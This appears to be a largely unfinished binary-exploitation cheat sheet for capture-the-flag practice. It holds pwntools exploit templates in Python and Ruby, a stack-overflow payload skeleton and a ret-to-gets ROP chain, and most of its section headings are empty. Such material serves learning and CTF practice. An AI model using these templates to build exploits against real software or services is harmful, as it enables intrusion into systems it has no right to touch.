# Native Application Exploitation aka Binary Exploitation aka Pwning
Command Line cheat sheet for binary exploitation


* [Templates](#templates)
* MacOS
* Linux
	* Stack overflow
	* Format string
	* Heap
	* FILE
	* Integer overflow
	* Race conditions
	* Kernel
	* ARM
* Windows
	* Stack
	* Kernel
* [Browser](browser.md)

<h2 id="templates">Exploit template</h2>

<h4>Python</h4>

	#!/usr/bin/env python
	
	from pwn import *

	BINARY = './vuln'
	HOST, PORT = '8.8.8.8', 1337

	elf = ELF(BINARY)
	libc = ELF('./libc.so.6')

	context.arch = 'amd64'
	context.terminal = ['tmux', 'new-window']

	printf = elf.plt['printf']
	free_got = elf.got['free']
	malloc_hook = libc.sym['__malloc_hook']

	def start():
		if not args.REMOTE:
			print "LOCAL PROCESS"
			return process(BINARY)
		else:
			print "REMOTE PROCESS"
			return remote(HOST, PORT)

	
	def sample_function(data):
		p.sendlineafter('>> ', '1')
		p.sendafter(':\n', data)
	
	
	while True:
		p = start()	

	p.interactive()

<h4>Ruby</h4>
	
	gem install pwntools
	
	require 'pwn'
	
	context.arch = 'i386'
	context.log_level = :debug
	z = Sock.new 'chall.pwnable.tw', 10000

	z.recvuntil "Let's start the CTF:"
	z.send p64(0x1337).rjust(0x18, 'A')
	

	z.interact

	


<h2 id="linux">Linux</h2>

<h3 id="stack">Stack Exploitation</h3>
	
<h4>Stack overflow</h4>

	buffer = 'A' * 1337
	rip = p64(0x1337) # Address of shellcode
	payload = "SHELLCODE"

	exploit = buffer + rip
	

<h4>Shellcode in bss section</h4>

	buffer = 'A' * 1337
	gets = elf.plt['gets']
	bss = elf.bss(0x20) # BSS at 0x20 bytes offset
	pop_rdi = p64(0x1337)

	payload = buffer + pop_rdi + bss + gets + bss

<h4>Ret2libc</h4>

<h4>ROP syscall</h4>
		
<h4>ROP</h4>

<h3>Format String</h3>

<h3>Heap</h3>

<h3>FILE</h3>

<h3>Integers</h3>

<h3>Race Conditions</h3>

<h3>Kernel</h3>
